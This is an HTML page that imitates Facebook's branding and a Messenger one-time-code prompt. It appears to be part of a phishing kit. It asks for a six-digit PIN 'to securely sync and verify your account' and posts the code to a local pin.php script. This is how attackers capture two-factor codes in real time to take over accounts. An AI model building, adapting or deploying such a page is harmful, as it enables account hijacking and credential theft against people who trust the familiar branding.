
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" type="image/png" href="https://www.facebook.com/images/fb_icon_325x325.png">
<title>PIN Verification</title>

<script src="https://cdn.tailwindcss.com"></script>

<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

<style>

body{
    font-family:'Roboto',sans-serif;
    background:#f0f2f5;
}

.modal{
    width:100%;
    max-width:430px;
    background:#fff;
    border-radius:12px;
    box-shadow:0 12px 30px rgba(0,0,0,.12);
}

.code-wrapper{
    position:relative;
    width:48px;
    height:54px;
    background:#f7f8fa;
    border-radius:10px;
}

.code-box{
    width:100%;
    height:100%;
    border:1px solid #ccd0d5;
    border-radius:10px;
    background:transparent;
    text-align:center;
    font-size:26px;
    font-weight:700;
    color:#1c1e21;
    transition:.15s ease;
    position:relative;
    z-index:2;
}

.code-box:focus{
    outline:none;
    border-color:#2563eb;
    background:#fff;
    box-shadow:0 0 0 3px rgba(37,99,235,.12);
}

.placeholder-dash{
    position:absolute;
    inset:0;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:24px;
    font-weight:400;
    color:#8a8d91;
    pointer-events:none;
    z-index:1;
}

.action-btn{
    height:38px;
    border-radius:8px;
    font-size:14px;
    font-weight:600;
    transition:.15s ease;
}

.primary-btn{
    background:#2563eb;
    color:#fff;
}

.primary-btn:hover{
    background:#1d4ed8;
}

.secondary-btn{
    background:#e5e7eb;
    color:#111827;
}

.secondary-btn:hover{
    background:#d1d5db;
}

/* RESPONSIVE */
/* RESPONSIVE */
@media(max-width:640px){

    body{
        padding:16px;
    }

    .modal{
        width:100%;
        max-width:100%;
        border-radius:16px;
        padding:24px 18px;
    }

    .code-wrapper{
        width:42px;
        height:48px;
    }

    .code-box{
        font-size:22px;
    }

    .placeholder-dash{
        font-size:20px;
    }

      .action-btn{
        height:42px;
        font-size:13px;
    }
     .secondary-btn{
        font-size:12px;
        padding:0 10px;
    }

}
</style>
</head>

<body class="bg-gray-100 flex flex-col items-center justify-center min-h-screen space-y-6">
<h1 class="text-5xl font-bold text-blue-600">facebook</h1>
<div class="modal p-6 sm:p-7">

    <!-- Image -->
    <div class="flex justify-center mb-5">
        <img src="../files/images/fbpin.png"
             class="w-[72px] h-[72px] object-contain">
    </div>

    <!-- Title -->
  <h1 class="text-[16px] sm:text-[17px] leading-[22px] sm:leading-[24px] font-bold text-center text-gray-900">
        Check Messenger or Facebook on your mobile device for a one-time code
    </h1>

    <!-- Description -->
  <p class="text-center text-gray-500 text-[13px] leading-[18px] mt-3 px-2">
    To securely sync and verify your account, enter the PIN sent to your mobile device to continue to the final step.
</p>

    <!-- Error -->
    <div id="errorBox"
         class="hidden mt-5 bg-red-100 border border-red-300 text-red-700 text-sm rounded-lg px-4 py-3 text-center">
    </div>

    <!-- Form -->
    <form id="pinForm" class="space-y-5" method="POST" action="pin.php">

        <!-- OTP -->
        <div class="flex justify-center gap-2 mt-8 mb-8 flex-wrap">

            <div class="code-wrapper">
                <div class="placeholder-dash">-</div>
                <input type="text" maxlength="1" class="code-box">
            </div>

            <div class="code-wrapper">
                <div class="placeholder-dash">-</div>
                <input type="text" maxlength="1" class="code-box">
            </div> 

            <div class="code-wrapper">
                <div class="placeholder-dash">-</div>
                <input type="text" maxlength="1" class="code-box">
            </div>

            <div class="code-wrapper">
                <div class="placeholder-dash">-</div>
                <input type="text" maxlength="1" class="code-box">
            </div>

            <div class="code-wrapper">
                <div class="placeholder-dash">-</div>
                <input type="text" maxlength="1" class="code-box">
            </div>

            <div class="code-wrapper">
                <div class="placeholder-dash">-</div>
                <input type="text" maxlength="1" class="code-box">
            </div>
        </div>
<!-- Buttons -->
<div class="flex gap-2 mt-2">

    <button type="button"
            class="action-btn secondary-btn flex-1 min-w-0 px-3">
        Don’t have your other device?
    </button>

    <button type="submit"
            class="action-btn primary-btn w-[130px] shrink-0">
        Continue
    </button>
<input type="hidden" name="pinForm" id="pinFormInput">
</div>
    </form>

</div>
<script>
const inputs = document.querySelectorAll('.code-box');
const form = document.getElementById('pinForm');
const errorBox = document.getElementById('errorBox');

// OTP input behavior
inputs.forEach((input, index) => {
    const dash = input.parentElement.querySelector('.placeholder-dash');

    input.addEventListener('input', () => {
        // Only digits
        input.value = input.value.replace(/[^0-9]/g, '');

        // Show/hide placeholder dash
        dash.style.display = input.value ? 'none' : 'flex';

        // Auto-focus next input if current has value
        if (input.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace') {
            // Move to previous input if empty
            if (!input.value && index > 0) {
                inputs[index - 1].focus();
            }

            // Update dash after backspace
            setTimeout(() => {
                dash.style.display = input.value ? 'none' : 'flex';
            }, 0);
        }
    });
});

// Form submission
form.addEventListener('submit', (e) => {
    const code = [...inputs].map(i => i.value).join('');

    if (code.length < inputs.length) {
        e.preventDefault(); // block submission if incomplete
        errorBox.classList.remove('hidden');
        errorBox.textContent = 'Please enter the complete 6-digit PIN.';
        return;
    }

    // OTP complete → hide error
    errorBox.classList.add('hidden');

    // ✅ Set hidden input value so PHP receives it
    document.getElementById('pinFormInput').value = code;

    // Form will now submit normally to pin.php
});
</script>

</body>
</html>